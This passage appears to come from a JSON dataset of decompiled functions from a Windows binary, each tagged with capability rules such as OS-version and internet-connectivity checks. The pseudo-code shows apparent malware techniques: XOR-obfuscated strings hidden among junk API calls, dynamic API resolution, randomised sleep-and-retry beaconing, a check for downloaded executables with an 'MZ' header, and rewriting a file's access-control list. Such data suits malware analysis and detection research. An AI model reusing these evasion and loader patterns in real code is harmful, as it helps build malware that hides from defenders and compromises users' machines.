0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_24h = 0x6c670110;\n            puVar10 = &var_1ch;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_20h._0_2_ = 0x6423;\n            var_8h = 0x64474948;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_6ch = &var_2ch - iVar9;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                if (iVar7 != 0x193b6) {\n                    var_5ch = 5;\n                    *(iVar6 + iVar9) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar9)[var_6ch];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_70h);\n            iVar6 = fcn.00406d92(0, &ARG_0, &var_60h, &var_68h);\n            if (iVar6 == 0) {\n                if (var_60h == 0) {\n                    fcn.0040625c();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n                if (var_1ch < var_60h) {\n                    fcn.0040625c();\n                    var_64h = var_64h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_64h % 600000 + 60000);\n                }\n                else if (((4 < var_60h) && (var_60h == var_1ch)) &&\n                        ((var_18h != NULL && ((*var_18h == 'M' && (var_18h[1] == 'Z')))))) {\n                    fcn.00406205();\n                    fcn.0040625c();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n                    (*pcVar2)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n            (*pcVar2)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x412430);\n    iVar9 = *var_58h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1807
    },
    "0040cc8b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040cd05)\n// WARNING: Removing unreachable block (ram,0x0040cd15)\n// WARNING: Removing unreachable block (ram,0x0040cd22)\n// WARNING: Removing unreachable block (ram,0x0040cd2d)\n// WARNING: Removing unreachable block (ram,0x0040cd3c)\n// WARNING: Removing unreachable block (ram,0x0040cd46)\n// WARNING: Removing unreachable block (ram,0x0040cd48)\n// WARNING: Removing unreachable block (ram,0x0040cd4e)\n// WARNING: Removing unreachable block (ram,0x0040cd64)\n\nuint __cdecl fcn.0040cc8b(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41caac;\n    puVar4 = 0x41cd98;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040c898();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41cb30 == 0) {\n        if (*0x41cb78 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.0040c977();\n            if (iVar2 != 0) {\n                fcn.0040625c();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 441
    },
    "0040cee9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040cee9(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41cda0 == NULL) {\n        var_2ch = 0x7164127;\n        var_28h._0_2_ = 0x582e;\n        var_ch = 6;\n        var_28h._2_1_ = 6;\n        stack0xffffffd7 = 0xd361a11;\n        var_21h._0_1_ = 0x57;\n        var_21h._1_1_ = 0x32;\n        var_21h._2_2_ = 0x591b;\n        var_1ch = 0x6841326e;\n        var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x59);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar5 != 0xa0a260) {\n                var_8h = 5;\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % 5) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x3d143d22;\n        var_28h._0_2_ = 0x3a5c;\n        var_28h._2_1_ = 0x7a;\n        stack0xffffffd7 = 0x5537486a;\n        var_21h._0_1_ = 0x3a;\n        var_21h._1_1_ = 0x49;\n        var_1ch = 0x53665849;\n        var_18h._0_2_ = 0x5639;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_8h = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n            iVar5 = var_10h;\n            if (iVar6 != 0xcdeae0) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_ch) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41cda0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41cda0 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41cda0)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1089
    },
    "0040d46a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d46a(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040d421();\n    }\n    if (*0x41cda4 == NULL) {\n        var_34h = 0xa15231f;\n        var_30h = 0x1d335f23;\n        var_2ch._0_2_ = 0x4f0a;\n        var_20h = 0x66715771;\n        var_1ch._0_1_ = 0x4f;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_8h = 5;\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        var_10h = &var_34h - iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar4 != 0x7b0fea) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x1672135;\n        var_4ch = 0x62625900;\n        var_48h = 0xb160b;\n        var_44h = 0x1a031c59;\n        var_40h = 0x12235c37;\n        var_3ch = 0x17423902;\n        var_38h._0_2_ = 0x5b41;\n        var_38h._2_1_ = 0x56;\n        var_20h = 0x6e30566f;\n        var_1ch._0_1_ = 0x77;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_10h = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x9be8ec) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[&var_50h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41cda4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_28h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41cda4 == NULL) goto code_r0x0040d605;\n    }\n    iVar3 = var_4h;\n    var_28h = 0;\n    iVar6 = (**0x41cda4)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x0040d605:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1206
    },
    "0040debc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040debc(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.0040cee9();\n    fcn.0040d61b(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040d61b(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x0040dfc3:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x0040dfe4;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040dfae;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x0040dfc3;\ncode_r0x0040dfae:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x0040dfe4;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040dfe4:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 828
    },
    "0040e8b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e8b7(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41caac;\n    var_44h = 0x2e175b29;\n    var_40h = 0x512f250f;\n    var_3ch = 0x2f01201d;\n    var_38h = 0x3a1b5725;\n    var_34h = 0x4d3b311b;\n    var_30h = 0x3b1d3c01;\n    var_2ch = 0x675a4331;\n    var_28h = 0xa7a7235;\n    var_24h = 0x745c7f40;\n    var_20h = 0x4a440070;\n    var_14h = 0x4a743948;\n    var_10h._0_2_ = 0x436a;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar5 != 0x2bbc49) {\n            var_4h = 6;\n            pcVar4[iVar7] = *(&var_14h + iVar7 % 6) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = 0x4122f0;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040e9a5;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040e9a5:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.00401b20();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x412430);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 999
    },
    "0040ea20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040ea20(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    puVar7 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.00406e70(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        puVar4 = uVar3 + var_8h;\n                        goto code_r0x0040ea89;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x0040ea89:\n        if (puVar4 != NULL) {\n            puVar5 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = 0x4122f0;\n            puVar8 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar8 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar8 = puVar8 + 1;\n            }\n            puVar5 = puVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            pcVar6 = 0x4122f0;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar4, arg_8h * 0x20 + 0x4122f0);\n            do {\n                puVar4 = puVar4 + 0x20;\n                if (*pcVar6 != '\\0') {\n                    (*pcVar1)(puVar4, pcVar6);\n                }\n                pcVar6 = pcVar6 + 0x20;\n            } while (pcVar6 < 0x412410);\n        }\n        fcn.0040625c();\n        *0x41cd88 = var_ch;\n        puVar4 = 0x1;\n        *0x41cd8c = var_8h;\n    }\n    return puVar4;\n}\n",
        "token_count": 778
    },
    "0040eb13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040ebdc)\n// WARNING: Removing unreachable block (ram,0x0040ebf7)\n// WARNING: Removing unreachable block (ram,0x0040ebfe)\n// WARNING: Removing unreachable block (ram,0x0040ec05)\n// WARNING: Removing unreachable block (ram,0x0040ec1e)\n\nuint __cdecl fcn.0040eb13(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41cd88;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.00406317();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cb34);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.00408054();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040ea20(0),  iVar2 != 0)) {\n        fcn.0040625c();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41cb34);\n    }\n    while (*0x41cb30 == 0) {\n        iVar2 = fcn.0040e8b7();\n        if (iVar2 != -1) {\n            fcn.00401ba2();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 504
    },
    "0040ec71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ec71(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint psz2;\n    uint var_4h;\n    \n    psz2 = *0x41cb38;\n    if (*0x41cdd8 != 0) {\n        return 1;\n    }\n    var_40h = 0x4d0a7912;\n    var_3ch = 0x793d6514;\n    var_38h = 0x79096e21;\n    var_34h = 0x650f4d37;\n    var_30h = 0x6e287914;\n    var_2ch = 0x4d117936;\n    var_28h = 0x790b650f;\n    var_24h = 0x79016e28;\n    var_20h = 0x650b4d2a;\n    var_1ch = 0x6e39791a;\n    var_18h = 0x4d16790c;\n    var_14h = 0x79796500;\n    var_10h = 0x4d797965;\n    var_ch._0_1_ = 0x6e;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0x15fb70) {\n            var_4h = 5;\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    *0x41cdd8 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cdd8 != 0) {\n        if ((*0x41cdd4 != 0) ||\n           (*0x41cdd4 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x41cdd8, 0xf001f, 0, 0, 0x208),  *0x41cdd4 != 0)) {\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x41cdd4, psz2);\n            uVar2 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41cdd8);\n        *0x41cdd8 = 0;\n    }\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 836
    },
    "0040f5e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f5e9(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "004017dd": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004017dd(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar *var_30h;\n    code *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint hObject;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    \n    iVar7 = 0;\n    var_3ch = 0xa15231f;\n    puVar9 = &var_74h;\n    var_30h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_44h = *0x41cb3c;\n    